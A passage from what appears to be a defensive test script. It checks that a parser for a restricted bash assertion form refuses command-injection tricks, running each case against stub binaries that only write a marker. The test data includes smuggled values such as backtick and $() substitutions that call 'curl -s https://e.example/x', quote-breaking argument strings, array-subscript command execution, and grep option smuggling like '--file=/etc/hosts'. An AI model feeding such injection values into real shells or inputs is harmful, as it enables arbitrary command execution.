-eq with an array-subscript operand	t "r" "x" bash -c '[ "$(cat "$1")" -eq "a[$(cmd)]" ]' _ "$CALLS"
-ge with a positional operand	t "r" "x" bash -c 'test "$1" -ge 0' _ "$CALLS"
a backtick inside a double-quoted pattern	t "r" "x" bash -c 'grep "a`curl -s https://e.example/x`" "$1"' _ "$CALLS"
${x} in a double-quoted pattern	t "r" "x" bash -c 'grep "${x}" "$1"' _ "$CALLS"
${x} unquoted	t "r" "x" bash -c 'grep ${x} "$1"' _ "$CALLS"
$((1+1))	t "r" "x" bash -c 'test $((1+1)) = 2' _
$( inside a grep -c pattern	t "r" "x" bash -c 'test "$(grep -c "a$(curl -s https://e.example/x)" "$1")" -ge 1' _ "$CALLS"
an arithmetic comparison on $(cat ...) (the file's text would be the expression)	t "r" "x" bash -c 'test "$(cat "$1")" -eq 0' _ "$work/evil"
an arithmetic comparison on a quoted word	t "r" "x" bash -c 'test "a" -eq 0' _
an arithmetic comparison on a bare word (a variable name)	t "r" "x" bash -c 'test a -eq 0' _
an arithmetic comparison on an inner variable	t "r" "x" bash -c 'test $x -eq 0' _
test -n	t "r" "x" bash -c 'test -n "$1"' _ "$CALLS"
test -z	t "r" "x" bash -c '[ -z "$1" ]' _ "$CALLS"
test -a (and)	t "r" "x" bash -c 'test -f "$1" -a -f "$1"' _ "$CALLS"
test -o (an option name)	t "r" "x" bash -c 'test -o errexit' _
test with one operand	t "r" "x" bash -c 'test a' _
test with four operands	t "r" "x" bash -c 'test a = b c' _
an operator outside the set (-nt)	t "r" "x" bash -c 'test "$1" -nt "$1"' _ "$CALLS"
a quoted operator	t "r" "x" bash -c 'test a "=" b' _
a quoted unary operator	t "r" "x" bash -c 'test "-f" "$1"' _ "$CALLS"
$[ ] legacy arithmetic	t "r" "x" bash -c 'test $[1+1] = 2' _
$[ ] on a variable holding a subscript that runs a command	t "r" "x" bash -c 'A=a[\$(cmd)]; test $[A] = 1' _
$(( )) on a variable holding a subscript that runs a command	t "r" "x" bash -c 'A=a[\$(cmd)]; test $((A)) = 1' _
(( )) arithmetic command	t "r" "x" bash -c 'A=a[\$(cmd)]; ((A))' _
let	t "r" "x" bash -c 'A=a[\$(cmd)]; let A' _
declare -i	t "r" "x" bash -c 'declare -i A; A=a[\$(cmd)]' _
typeset -i	t "r" "x" bash -c 'typeset -i A; A=a[\$(cmd)]' _
local (inside a function)	t "r" "x" bash -c 'f() { local -i A=a[\$(cmd)]; }; f' _
printf -v with a subscript	t "r" "x" bash -c 'printf -v a[\$(cmd)] x' _
read into a subscript	t "r" "x" bash -c 'read a[\$(cmd)] <<< x' _
eval of a word	t "r" "x" bash -c 'eval cmd' _
. (dot) source	t "r" "x" bash -c '. "$1"' _ "$work/f"
an array-subscript assignment	t "r" "x" bash -c 'a[\$(cmd)]=1' _
an array subscript as a test operand	t "r" "x" bash -c 'test a[1] = 1' _
indirect ${!x}	t "r" "x" bash -c 'x=a[\$(cmd)]; test "${!x}" = 1' _
$'...' ANSI-C quotes	t "r" "x" bash -c 'grep $'"'"'\x61'"'"' "$1"' _ "$CALLS"
<( ) process substitution as a grep file	t "r" "x" bash -c 'grep "a" <(cmd)' _
>( ) process substitution	t "r" "x" bash -c 'grep "a" "$1" > >(cmd)' _ "$CALLS"
{a,b} brace expansion in command position	t "r" "x" bash -c '{cmd,x}' _
a glob in command position	t "r" "x" bash -c 'cm?' _
a bracket glob in command position	t "r" "x" bash -c '[c]md' _
a glob as a test operand	t "r" "x" bash -c 'test -f *' _
a glob as a grep pattern	t "r" "x" bash -c 'grep * "$1"' _ "$CALLS"
a here-string <<<	t "r" "x" bash -c 'grep "a" <<< "$1"' _ "$CALLS"
an unquoted grep pattern word	t "r" "x" bash -c 'grep a "$1"' _ "$CALLS"
$ in the title	t "r" "x $u" bash -c 'grep -q . "$1"' _ "$CALLS"
$[ ] in the title	t "r" "$[1+1]" bash -c 'grep -q . "$1"' _ "$CALLS"
$(( )) in the title	t "r" "$((1+1))" bash -c 'grep -q . "$1"' _ "$CALLS"
${!x} in the rule label	t "r ${!x}" "x" bash -c 'grep -q . "$1"' _ "$CALLS"
$ in the rule label	t "r $x" "x" bash -c 'grep -q . "$1"' _ "$CALLS"
a backslash in the title	t "r" "x \$y" bash -c 'grep -q . "$1"' _ "$CALLS"
an array subscript in an argument path	t "r" "x" bash -c 'grep -q . "$1"' _ "$work/a[1]"
$(( )) in an argument	t "r" "x" bash -c 'grep -q . "$1"' _ "$((1))"
more ARGs than max_args (ten)	t "r" "x" bash -c 'grep -q . "$1"' _ "$CALLS" "$CALLS" "$CALLS" "$CALLS" "$CALLS" "$CALLS" "$CALLS" "$CALLS" "$CALLS" "$CALLS"
grep -vq as one word (the whitelist lists -v and -q, one option per word)	t "r" "x" bash -c 'grep -vq "a" "$1"' _ "$CALLS"
Codex R3 reproduction: a double-quoted --file=... read as a grep OPTION	t "r" "x" bash -c 'grep "--file=/etc/hosts" "$1"' _ "$CALLS"
Codex R3 reproduction: the same inside the count substitution	t "r" "x" bash -c 'test "$(grep -c "--file=/etc/hosts" "$1")" -ge 1' _ "$CALLS"
Sonnet B1: a double-quoted --version	t "r" "x" bash -c 'grep "--version" "$1"' _ "$CALLS"
Sonnet B1: a double-quoted --pager=... in the count substitution	t "r" "x" bash -c 'test "$(grep -c "--pager=touch M" "$1")" -ge 1' _ "$CALLS"
a double-quoted -f	t "r" "x" bash -c 'grep "-f" -- "a" "$1"' _ "$CALLS"
a double-quoted --file=x before --	t "r" "x" bash -c 'grep "--file=x" -- "a" "$1"' _ "$CALLS"
a double-quoted -e with a pattern	t "r" "x" bash -c 'grep "-e" "pat" "$1"' _ "$CALLS"
--regexp=x as the pattern after --	t "r" "x" bash -c 'grep -- "--regexp=x" "$1"' _ "$CALLS"
a double-quoted -r	t "r" "x" bash -c 'grep "-r" -- "a" "$1"' _ "$CALLS"
a double-quoted -E	t "r" "x" bash -c 'grep "-E" -- "a" "$1"' _ "$CALLS"
a pattern that starts with - (even after --)	t "r" "x" bash -c 'grep -- "-a" "$1"' _ "$CALLS"
grep without -- before the pattern	t "r" "x" bash -c 'grep -q "a" "$1"' _ "$CALLS"
grep without -- in the count substitution	t "r" "x" bash -c 'test "$(grep -c "a" "$1")" -ge 1' _ "$CALLS"
-- placed after the pattern	t "r" "x" bash -c 'grep "a" -- "$1"' _ "$CALLS"
a literal file operand	t "r" "x" bash -c 'grep -- "a" "f"' _ "$CALLS"
a second pattern word	t "r" "x" bash -c 'grep -- "a" "b" "$1"' _ "$CALLS"
cat without --	t "r" "x" bash -c 'test "$(cat "$1")" = "a"' _ "$CALLS"
cat -- with a literal operand	t "r" "x" bash -c 'test "$(cat -- "f")" = "a"' _ "$CALLS"
an option after --	t "r" "x" bash -c 'grep -- -v "a" "$1"' _ "$CALLS"
Codex R6: a literal path as a file-test operand	t "r" "x" bash -c 'test -f "/etc/passwd"' _
Codex R6: a cat substitution as a file-test operand	t "r" "x" bash -c 'test -s "$(cat -- "$1")"' _ "$CALLS"
a grep count substitution as a file-test operand	t "r" "x" bash -c '[ -e "$(grep -c -- "a" "$1")" ]' _ "$CALLS"
a double-quoted word as a file-test operand	t "r" "x" bash -c 'test -d "x"' _
a bare number as a file-test operand	t "r" "x" bash -c 'test -r 1' _
a file test with an extra argument	t "r" "x" bash -c 'test -e "$1" x' _ "$CALLS"
a file test on a positional beyond the arguments	t "r" "x" bash -c 'test -f "$2"' _ "$CALLS"
Sonnet R6: cat with two operands	t "r" "x" bash -c 'test "$(cat -- "$1" "$2")" = "a"' _ "$CALLS" "$CALLS"
Sonnet R6: cat with an extra word as a command	t "r" "x" bash -c 'cat -- "$1" EXTRA' _ "$CALLS"
cat with two positionals as a command	t "r" "x" bash -c 'cat -- "$1" "$2"' _ "$CALLS" "$CALLS"
EOF
while IFS=$'\t' read -r what line; do
  hf "$line"
  CASE="AC16 harness form: refused ($what): exit 1, says refused"
  check test "$rc" -eq 1; check grep -q '^refused: ' "$work/hf.out"
done <"$work/hf-refused.tsv"
# characters bash reads differently from the parser: anything outside space, tab and printable ASCII (Sonnet R1 reproduction 1: a literal newline in the body)
python3 - "$work" <<'PY'
import sys
w = sys.argv[1]
B = 't "r" "x" bash -c \'grep a "$1"\' _ "$CALLS"'
cases = [
    ("Sonnet R1 reproduction 1: a literal newline in the body (bash runs the text after it as a second command)", 't "r" "x" bash -c \'grep a "$1"\ncurl -s https://e.example/x\' _ "$CALLS"'),
    ("a literal newline in the title", B.replace('"x"', '"x\ny"')),
    ("a literal newline in the rule label", B.replace('"r"', '"r\ns"')),
    ("a literal newline after the arguments", B + "\ncurl -s https://e.example/x"),
    ("a carriage return in the body", 't "r" "x" bash -c \'grep a "$1"\rcurl -s https://e.example/x\' _ "$CALLS"'),
    ("a control character (0x01) in the body", B.replace("grep a", "grep a\x01")),
    ("an escape (0x1b) in the title", B.replace('"x"', '"x\x1b[0m"')),
    ("a vertical tab in the body", B.replace("grep a", "grep a\x0bcurl")),
    ("a form feed in the body", B.replace("grep a", "grep a\x0c")),
    ("DEL (0x7f) in the body", B.replace("grep a", "grep a\x7f")),
    ("a non-ASCII letter in the title", B.replace('"x"', '"café"')),
    ("a non-breaking space in the body", B.replace("grep a", "grep a")),
]
for i, (what, line) in enumerate(cases):
    open("%s/ctl-%02d.txt" % (w, i), "w", encoding="utf-8", newline="").write(line)
    open("%s/ctl-%02d.what" % (w, i), "w").write(what)
PY
for f in "$work"/ctl-*.txt; do
  hff "$f"
  CASE="AC16 harness form: refused ($(cat "${f%.txt}.what")): exit 1, says refused"
  check test "$rc" -eq 1; check grep -q '^refused: ' "$work/hf.out"
done
cat >"$work/hf-accepted.tsv" <<'EOF'
the whole vocabulary	t "r" "x" bash -c 'grep -q -- "a" "$1" && ! grep -E -- "b|c" "$1" || test "$(grep -c -- "a" "$1")" -ge 3; [ "$(cat -- "$1")" = 2 ] | grep -q -- .' _ "$CALLS"
exit with one literal digit	t "r" "x" bash -c 'grep -- "a" "$1" | grep -v -q -- "b" && exit 1; exit 0' _ "$CALLS"
the file tests -f -s -e -d -r and !	t "r" "x" bash -c 'test -f "$1" && [ -s "$1" ] && test -e "$1" && ! test -d "$1" && test ! -d "$1" && [ -r "$1" ]' _ "$CALLS"
string = and != on $(cat -- ...)	t "r" "x" bash -c 'test "$(cat -- "$1")" != "b" && [ "$(cat -- "$2")" = "a" ]' _ "$work/rc" "$CALLS"
arithmetic on digits and on $(grep -c ...)	t "r" "x" bash -c 'test "$(grep -c -E -- "a" "$1")" -eq 1 && [ 3 -ne 4 ] && test 1 -lt 2 && test 2 -le 2 && test 3 -gt 2' _ "$CALLS"
escaped dot and brackets in a pattern	t "r" "x" bash -c 'grep -Eq -- "\[a\.b\]" "$1"' _ "$CALLS"
a pattern whose first character is a space, then a dash	t "r" "x" bash -c 'grep -q -- " -x" "$1"' _ "$CALLS"
no argument after _	t "r" "x" bash -c 'test 1 -eq 1' _
synthetic, the HTTPS-check shape: no unknown field, one flag with its value, no second flag, a count	t "rule 9" "synthetic: every call has the flag --alpha with the value =beta, once, and no plain http address" bash -c 'grep -q -- " unk:\[" "$1" && exit 1; grep -- "^argv \[tool\]" "$1" | grep -v -q -- " opt:\[--alpha\] val:\[=beta\]" && exit 1; grep -Eq -- " opt:\[--alpha\] .* opt:\[--alpha\]| url:\[http://" "$1" && exit 1; test "$(grep -c -- "^argv \[tool\]" "$1")" -ge 3' _ "$work/argv"
synthetic, the cap-check shape: selected calls, a positive whole-number value, a count	t "rule 9" "synthetic: every selected call has a positive cap" bash -c 'grep -E -- "^argv \[tool\] .* url:\[https://example\.invalid/(a.b|cd)/" "$1" | grep -v -Eq -- " opt:\[--cap\] val:\[(1|2|3|4|5|6|7|8|9)(0|1|2|3|4|5|6|7|8|9)*\]" && exit 1; test "$(grep -c -E -- "^argv \[tool\] .* url:\[https://example\.invalid/(a.b|cd)/" "$1")" -ge 1' _ "$work/argv"
synthetic, the status-file shape: an exit status, an existing log, no selected call	t "rule 9" "synthetic: status 2, the log exists and holds no selected call" bash -c 'test "$(cat -- "$1")" = 2 && test -f "$2" && ! grep -q -E -- " url:\[https://example\.invalid/(a.b|cd)/" "$2"' _ "$work/rc" "$work/argv"
synthetic, the first-field shape: a required first field and no redirect flag in any letter group	t "rule 9" "synthetic: every call starts with opt -q and none has -L" bash -c 'grep -- "^argv \[tool\]" "$1" | grep -v -q -- "^argv \[tool\] opt:\[-q\]" && exit 1; grep -- "^argv \[tool\]" "$1" | grep -Eq -- " opt:\[-(f|s|S|g|q)*L(f|s|S|g|q|o|m)*\]| opt:\[--location\]" && exit 1; test "$(grep -c -- "^argv \[tool\] opt:\[-q\]" "$1")" -ge 3' _ "$work/argv"
a file test on a positional ($1 or $2)	t "r" "x" bash -c 'test -f "$1" && [ -s "$2" ] && ! test -d "$2"' _ "$work/rc" "$CALLS"
EOF
while IFS=$'\t' read -r what line; do
  hf "$line"
  CASE="AC16 harness form: accepted ($what): exit 0"
  check test "$rc" -eq 0; check grep -q '^harness assertion' "$work/hf.out"
done <"$work/hf-accepted.tsv"
# the distinct lines of the committed rows for bin/refresh-inputs-test.sh (the final P3 tree): the harness lines among them must be accepted, and all of them run in the runtime proof
cat >"$work/hf-real.txt" <<'EOF'
printf -v FETCH %s curl
EOF
while IFS= read -r line; do
  case "$line" in t\ *) hf "$line"; CASE="AC16 harness form: accepted (the committed row line ${line:0:60}...): exit 0"; check test "$rc" -eq 0;; esac
done <"$work/hf-real.txt"
CASE="AC16 harness form: the real-line list is exactly the distinct lines of the committed rows for bin/refresh-inputs-test.sh (by whole-line hash)"
check python3 - "$work/hf-real.txt" "$root/.github/supply-chain-exceptions.json" <<'PY'
import hashlib, json, sys
H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()
real = {H(" ".join(l.split())) for l in open(sys.argv[1]).read().split("\n") if l}
rows = {r["line"] for r in json.load(open(sys.argv[2]))["unmeasured_text"] if r["file"] == "bin/refresh-inputs-test.sh"}
assert real == rows, (sorted(real ^ rows))
PY
# --- RUNTIME proof (Sonnet R1): every corpus line is EXECUTED under every bash on PATH (one per version: bash 5, whose test -v / -R / arithmetic operands
# evaluate $(...) even in single quotes, and, where present, an older bash such as 3.2), with a stub directory first on PATH whose curl, wget, touch, cmd and
# ls only write a marker file; the inner bash is the same shell. Then: every line that wrote the marker was refused by the parser, the planted reproductions
# did write it (the harness detects a run), and every accepted line (the corpus and the committed real lines) ran and wrote nothing, with plain paths and
# with quote-, substitution- and subscript-carrying argument values.
cat >"$work/hf_run.py" <<'PY'
import json, os, subprocess, sys, tempfile
hfpy, w = sys.argv[1], sys.argv[2]
def shells():                                              # every bash on PATH, one per version: bash 5 (the reproductions) and, where present, an older one (3.2)
    seen, out = set(), []
    for d in os.environ.get("PATH", "").split(os.pathsep):
        p = os.path.join(d, "bash")
        if d and os.access(p, os.X_OK):
            r = subprocess.run([p, "-c", "echo ${BASH_VERSINFO[0]}.${BASH_VERSINFO[1]}"], capture_output=True, text=True, stdin=subprocess.DEVNULL)
            v = r.stdout.strip()
            if r.returncode == 0 and v and v not in seen:
                seen.add(v); out.append((p, v))
    return out
SH = shells()
b5 = next((p for p, v in SH if int(v.split(".")[0]) >= 5), None)
corpus = []
for kind, name in (("refused", "hf-refused.tsv"), ("accepted", "hf-accepted.tsv")):
    for l in open(os.path.join(w, name)).read().split("\n"):
        if l:
            what, line = l.split("\t", 1); corpus.append((kind, what, line))
for l in open(os.path.join(w, "hf-real.txt")).read().split("\n"):
    if l:
        corpus.append(("real", l[:60], l))
for f in sorted(os.listdir(w)):
    if f.startswith("ctl-") and f.endswith(".txt"):
        corpus.append(("refused", open(os.path.join(w, f[:-4] + ".what")).read(), open(os.path.join(w, f), encoding="utf-8", newline="").read()))
# argument values that would add a command if the outer shell spliced them into code (Codex R1): the accepted form passes them as data only
HOSTILE = ["x'; curl -s https://e.example/x; #", 'x"; curl -s https://e.example/x; #', "$(curl -s https://e.example/x)", "a[$(curl -s https://e.example/x)]",
           "`curl -s https://e.example/x`"]
out = {"bash5": b5, "shells": [v for _, v in SH], "hostile": HOSTILE, "lines": []}
if b5:
    for kind, what, line in corpus:
        marks = {}
        for sh, ver in SH:
            d = tempfile.mkdtemp(dir=w, prefix="hfrun.")
            st = os.path.join(d, "stubs"); os.mkdir(st)
            mark = os.path.join(d, "marker")
            for n in ("curl", "wget", "touch", "cmd", "ls"):
                p = os.path.join(st, n); open(p, "w").write("#!%s\necho \"$0 $*\" >>\"$MARK\"\n" % sh); os.chmod(p, 0o755)
            p = os.path.join(st, "bash"); open(p, "w").write("#!%s\nexec %s \"$@\"\n" % (sh, sh)); os.chmod(p, 0o755)
            for n, t in (("f", "a\n"), ("g", "b\n"), ("rc", "0\n"), ("calls", "curl --proto =https --tlsv1.2 -g --max-filesize 1 --max-time 1 x\n"),
                         ("evil", "a[$(curl -s https://e.example/x)]\n")):
                open(os.path.join(d, n), "w").write(t)
            def run(work, calls, u):
                if os.path.exists(mark): os.remove(mark)
                env = {"PATH": st + os.pathsep + os.environ["PATH"], "HOME": d, "MARK": mark, "work": work, "CALLS": calls, "u": u, "LC_ALL": "C"}
                try:
                    subprocess.run([sh, "-c", 't() { shift 2; "$@"; }\n' + line], cwd=d, env=env, stdin=subprocess.DEVNULL, capture_output=True, timeout=20)
                except subprocess.TimeoutExpired:
                    pass
                return os.path.exists(mark)
            marks[ver] = {"plain": run(d, os.path.join(d, "calls"), "x"), "hostile": [h for h in HOSTILE if run(h, h, h)]}
        verdict = subprocess.run([sys.executable, hfpy, line], capture_output=True, text=True, stdin=subprocess.DEVNULL)
        out["lines"].append({"kind": kind, "what": what, "marked": any(m["plain"] for m in marks.values()),
                             "marked_hostile": sorted({h for m in marks.values() for h in m["hostile"]}), "by_shell": marks,
                             "refused": verdict.returncode == 1 and verdict.stdout.startswith("refused: "),
                             "accepted": verdict.returncode == 0 and verdict.stdout.startswith("harness assertion")})
json.dump(out, open(os.path.join(w, "hf-run.json"), "w"), indent=1)
PY
python3 "$work/hf_run.py" "$work/harness_form.py" "$work" </dev/null
hfr() { python3 - "$work/hf-run.json" "$1" <<'PY'
import json, sys
r = json.load(open(sys.argv[1])); L = r["lines"]; m = sys.argv[2]
assert r["bash5"], "no bash 5 on PATH"
if m == "marked-refused": bad = [x["what"] for x in L if (x["marked"] or x["marked_hostile"]) and not x["refused"]]
elif m == "accepted-clean": bad = [x["what"] for x in L if (x["kind"] in ("accepted", "real")) and (x["marked"] or x["marked_hostile"] or not x["accepted"] and x["kind"] == "accepted")]; assert sum(x["kind"] == "real" for x in L) == sum(1 for l in open(sys.argv[1].replace("hf-run.json", "hf-real.txt")) if l.strip())
elif m == "repros-mark":
    bad = [x["what"] for x in L if x["what"].startswith(("Sonnet R1 reproduction", "test -v \"a[$(touch X)]\"", "[ -v \"x[$(cmd)]\" ]")) and not x["marked"]]
    bad += [x["what"] for x in L if x["what"].startswith("Codex R1 reproduction") and not x["marked_hostile"]]
    assert sum(x["what"].startswith(("Sonnet R1 reproduction", "Codex R1 reproduction")) for x in L) == 3
print(sum(bool(x["marked"] or x["marked_hostile"]) for x in L), "of", len(L), "corpus lines wrote the marker (plain or hostile argument values); bad:", bad)
assert not bad, bad
PY
}
CASE="AC16 harness runtime: a bash of version 5 or newer is on PATH (the runtime proof needs it)"
check python3 -c "import json,sys; assert json.load(open(sys.argv[1]))['bash5']" "$work/hf-run.json"
CASE="AC16 harness runtime: the planted reproductions (newline in the body, test -v / [ -v with a \$(...) subscript; Codex: a double-quoted body run with a quote-carrying \$CALLS) DO write the marker under bash 5: the harness detects a run"
check hfr repros-mark
CASE="AC16 harness runtime: every corpus line that wrote the marker when run is refused by the parser"
check hfr marked-refused
CASE="AC16 harness runtime: every accepted line (the corpus and every distinct committed real line) runs under bash 5 and writes no marker, with plain paths AND with \$work, \$CALLS and \$u set to quote-, substitution- and subscript-carrying values"
check hfr accepted-clean
hfr marked-refused >"$work/hf-run.summary" 2>&1 || true; cat "$work/hf-run.summary"
CASE="AC16 harness runtime: the shells the corpus ran under are reported (one per bash version on PATH)"
check python3 -c "import json,sys; r=json.load(open(sys.argv[1])); print('shells:', r['shells']); assert r['shells']" "$work/hf-run.json"
python3 -c "import json,sys; print('harness runtime shells:', json.load(open(sys.argv[1]))['shells'])" "$work/hf-run.json"
# --- COMPLEMENT enumeration: every token class outside HARNESS_WHITELIST (every character, every bash keyword and builtin, external commands, every test
# operator, grep options, every variable name bash lists plus the specials and near-misses of work / CALLS) in every position it can take (RULE, TITLE,
# BODY command position, before a command, BODY argument, grep option, inside a double-quoted pattern, test operator, separator, after a pipe, as a
# substitution, exit status, ARG name and path), plus the refused corpus. One case per class; each line must be refused.
cat >"$work/hf_enum.py" <<'PY'
import importlib.util, json, os, subprocess, sys
# hf_enum.py JUDGE.py SKIP.py REFUSED.tsv OUT.json: every token class OUTSIDE SKIP's HARNESS_WHITELIST, in every position it can take, judged by JUDGE's parser.
# The universe of tokens is fixed here (every character, every keyword and builtin bash lists, the external commands, every test operator, a broad set of grep
# options, every variable name bash lists plus the specials), so widening the whitelist by one token turns an expected refusal into an acceptance.
def load(p, n):
    spec = importlib.util.spec_from_file_location(n, p); m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m); return m
J, S = load(sys.argv[1], "judge_mod"), load(sys.argv[2], "skip_mod")
W = S.HARNESS_WHITELIST
def bash_lists():
    for d in os.environ.get("PATH", "").split(os.pathsep):
        p = os.path.join(d, "bash")
        if d and os.access(p, os.X_OK):
            r = subprocess.run([p, "-c", "echo ${BASH_VERSINFO[0]}"], capture_output=True, text=True, stdin=subprocess.DEVNULL)
            if r.returncode == 0 and r.stdout.strip().isdigit() and int(r.stdout) >= 5:
                g = lambda f: subprocess.run(["env", "-i", p, "--norc", "--noprofile", "-c", "compgen " + f], capture_output=True, text=True, stdin=subprocess.DEVNULL).stdout.split()
                return g("-k"), g("-b"), g("-v")
    return [], [], []
kw, bi, vs = bash_lists()
KEYWORDS = sorted(set(kw) | {"if", "then", "else", "elif", "fi", "case", "esac", "for", "select", "while", "until", "do", "done", "in", "function", "time", "coproc", "{", "}", "!", "[[", "]]"})
BUILTINS = sorted(set(bi) | {"eval", "source", ".", "exec", "command", "builtin", "let", "declare", "typeset", "local", "readonly", "export", "read", "mapfile", "readarray",
                             "printf", "echo", "set", "unset", "shift", "trap", "alias", "enable", "hash", "type", "cd", "pushd", "ulimit", "umask", "wait", "kill", "true", "false", ":"})
EXTERNAL = ["curl", "wget", "sh", "bash", "zsh", "dash", "python3", "perl", "ruby", "node", "nc", "ssh", "scp", "env", "xargs", "find", "awk", "sed", "tee", "dd", "rm", "cp",
            "mv", "ln", "chmod", "ls", "touch", "cmd", "git", "gh", "openssl", "base64", "tar", "unzip", "install", "sudo", "nohup", "timeout", "watch", "egrep", "fgrep", "zgrep"]
WORDS = sorted(set(KEYWORDS + BUILTINS + EXTERNAL) | {"$x", "$1", "$(cmd)", "`cmd`", "${x}", "$[1]", "$((1))", "a[1]", "x=1", "*", "?", "~", "-", "--", "'a'", "\\a"})
TEST_OPS = ["-a", "-b", "-c", "-d", "-e", "-f", "-g", "-h", "-k", "-p", "-r", "-s", "-t", "-u", "-w", "-x", "-G", "-L", "-N", "-O", "-S", "-z", "-n", "-o", "-v", "-R",
            "=", "==", "!=", "<", ">", "=~", "-ef", "-nt", "-ot", "-eq", "-ne", "-lt", "-le", "-gt", "-ge", "!", "(", ")", "-A", "-l"]
GREP_OPTS = ["-f", "-e", "-r", "-R", "-P", "-z", "-o", "-l", "-L", "-n", "-c", "-i", "-x", "-w", "-F", "-G", "-A", "-B", "-C", "-H", "-h", "-s", "-U", "-a", "-I", "-m", "-b",
             "-d", "-D", "-T", "-Z", "--file", "--file=x", "--include=*", "--exclude=*", "--null", "--color", "--regexp", "--recursive", "-Ef", "-qf", "-E", "-q", "-v", "-Eq", "-vq", "--"]
VARS = sorted(set(vs) | {"0", "1", "9", "@", "*", "#", "?", "-", "$", "!", "_", "HOME", "PATH", "IFS", "BASH_ENV", "ENV", "PS4", "u", "x", "other", "Work", "works",
                         "WORK", "CALL", "calls", "CALLS2", "CALLSx", "wor", "w"})
CHARS = [chr(c) for c in range(128)] + ["é", " ", " ", "﻿"]
SEPS = ["&", ";;", "|&", "&>", ">", "<", ">>", "<<", "<<<", ">|", "<>", "(", ")", "{", "}", "`", "\n", "\r", "&&&", "|||", ";&", ";;&"] + CHARS
EXITS = ["10", "-1", "x", "1 2", "01", "\"1\"", "$x", "256", "9 9", "\"$1\""] + [c for c in CHARS]
BODY = lambda b, args=' _ "$CALLS"': "t \"r\" \"x\" bash -c '" + b + "'" + args
L = []
def case(cls, line, reason=None): L.append((cls, line, reason))
for c in CHARS:
    if c not in W["rule_title_chars"]:
        case("a character outside rule_title_chars, in the RULE", 't "r' + c + '" "x" bash -c \'grep -q -- . "$1"\' _ "$CALLS"')
        case("a character outside rule_title_chars, in the TITLE", 't "r" "x' + c + '" bash -c \'grep -q -- . "$1"\' _ "$CALLS"')
    if c not in W["line_chars"]:
        case("a character outside line_chars (refused for that reason)", 't "r" "x' + c + '" bash -c \'grep -q . "$1"\' _ "$CALLS"', "line character set")
    if c not in W["dquote_chars"]:
        case("a character outside dquote_chars, in a double-quoted pattern", BODY('grep -q -- "a' + c + 'b" "$1"'))
    if "\\" + c not in W["dquote_escapes"]:
        case("a backslash sequence outside dquote_escapes", BODY('grep -q -- "a\\' + c + 'b" "$1"'))
    if c not in " \t" and c not in W["grep_options"] and c not in W["grep_bare_patterns"]:
        case("a character as an unquoted grep pattern", BODY('grep -q -- ' + c + ' "$1"'))
        if c not in W["grep_options"]:
            case("a character as an unquoted grep option", BODY('grep -q ' + c + ' -- "a" "$1"'))
    if c not in " \t":
        case("a character in BODY command position", BODY(c + ' "$1"'))
        case("a character glued to a command word", BODY('grep' + c + ' -q -- . "$1"'))
    if c not in W["arg_path_chars"]:
        case("a character outside arg_path_chars, in an ARG path", 't "r" "x" bash -c \'grep -q -- . "$1"\' _ "$CALLS/x' + c + '"')
for s in SEPS:
    if s not in W["separators"] and s not in " \t":
        case("a separator outside separators", BODY('grep -q -- "a" "$1" ' + s + ' grep -q -- "b" "$1"'))
for w in WORDS:
    if w not in W["commands"]:
        case("a word outside commands, in BODY command position", BODY(w + ' "$1"'))
        case("a word outside commands, after a negation", BODY('! ' + w + ' "$1"'))
    if w not in W["grep_options"] and w not in W["grep_bare_patterns"]:
        case("a word as an unquoted grep option", BODY('grep -q ' + w + ' -- "a" "$1"'))
        case("a word as an unquoted grep pattern", BODY('grep -q -- ' + w + ' "$1"'))
    if w not in W["pipe_into"]:
        case("a word outside pipe_into, after a pipe", BODY('grep -- "a" "$1" | ' + w + ' "$1"'))
    if w not in W["substitutions"]:
        case("a word outside substitutions, as a substitution command", BODY('test "$(' + w + ' -- "$1")" = "a"'))
    case("a word as an unquoted ARG", 't "r" "x" bash -c \'grep -q -- . "$1"\' _ ' + w)
for w in sorted(set(WORDS) | set(CHARS)):
    if w not in W["negation"] and w not in W["commands"] and w not in " \t":
        case("a word before a command (outside negation)", BODY(w + ' grep -q -- . "$1"'))
        case("a word before a test expression (outside negation)", BODY('test ' + w + ' -f "$1"'))
for c in W["commands"]:
    if c not in W["pipe_into"]:
        case("a command outside pipe_into, after a pipe", BODY('grep -- "a" "$1" | ' + {"cat": 'cat -- "$1"', "test": 'test -f "$1"', "[": '[ -f "$1" ]', "exit": "exit 1"}.get(c, c + ' "$1"')))
for o in TEST_OPS:
    if o not in W["test_unary"]:
        case("a test operator outside test_unary (OP X)", BODY('test ' + o + ' "$1"'))
        case("a [ operator outside test_unary (OP X)", BODY('[ ' + o + ' "$1" ]'))
    if o not in W["test_string"] and o not in W["test_count"]:
        case("a test operator outside test_string / test_count (X OP Y)", BODY('test "$1" ' + o + ' "a"'))
        case("a test operator outside test_string / test_count (N OP N)", BODY('test 1 ' + o + ' 2'))
for o in GREP_OPTS:
    if o not in W["grep_options"]:
        case("a grep option outside grep_options", BODY('grep ' + o + ' -- "a" "$1"'))
        case("a grep option outside grep_options, in the count substitution", BODY('test "$(grep -c ' + o + ' -- "a" "$1")" -ge 1'))
for e in EXITS:
    if e not in W["exit_status"] and e not in " \t":
        case("an exit status outside exit_status", BODY('grep -q -- "a" "$1" && exit ' + e))
for v in VARS:
    if v not in W["arg_names"]:
        case("a variable outside arg_names, as an ARG", 't "r" "x" bash -c \'grep -q -- . "$1"\' _ "$' + v + '"')
        case("a variable outside arg_names, as an ARG path", 't "r" "x" bash -c \'grep -q -- . "$1"\' _ "$' + v + '/x"')
        if not (len(v) == 1 and v in "123456789"):                    # "$1".."$9" whole is the positional the whitelist names
            case("a variable in a double-quoted pattern", BODY('grep -q -- "$' + v + '" "$1"'))
        case("a variable as an unquoted BODY argument", BODY('grep -q -- $' + v + ' "$1"'))
        case("a variable in the TITLE", 't "r" "x $' + v + '" bash -c \'grep -q -- . "$1"\' _ "$CALLS"')
QOPTS = sorted(set(GREP_OPTS) | {"--file=/etc/hosts", "--file=pats", "--version", "--pager=touch M", "--filter=cmd", "--view", "--regexp=x", "-e", "-f", "-r", "-E", "-q", "-v", "-Eq", "--", "-", "-c"})
for o in QOPTS:
    case("an option-like word DOUBLE-QUOTED in a grep option position", BODY('grep "' + o + '" -- "a" "$1"'))
    case("an option-like word DOUBLE-QUOTED as the grep pattern", BODY('grep -q -- "' + o + '" "$1"'))
    case("an option-like word DOUBLE-QUOTED as a grep file operand", BODY('grep -q -- "a" "' + o + '"'))
    case("an option-like word DOUBLE-QUOTED in the count substitution's option position", BODY('test "$(grep -c "' + o + '" -- "a" "$1")" -ge 1'))
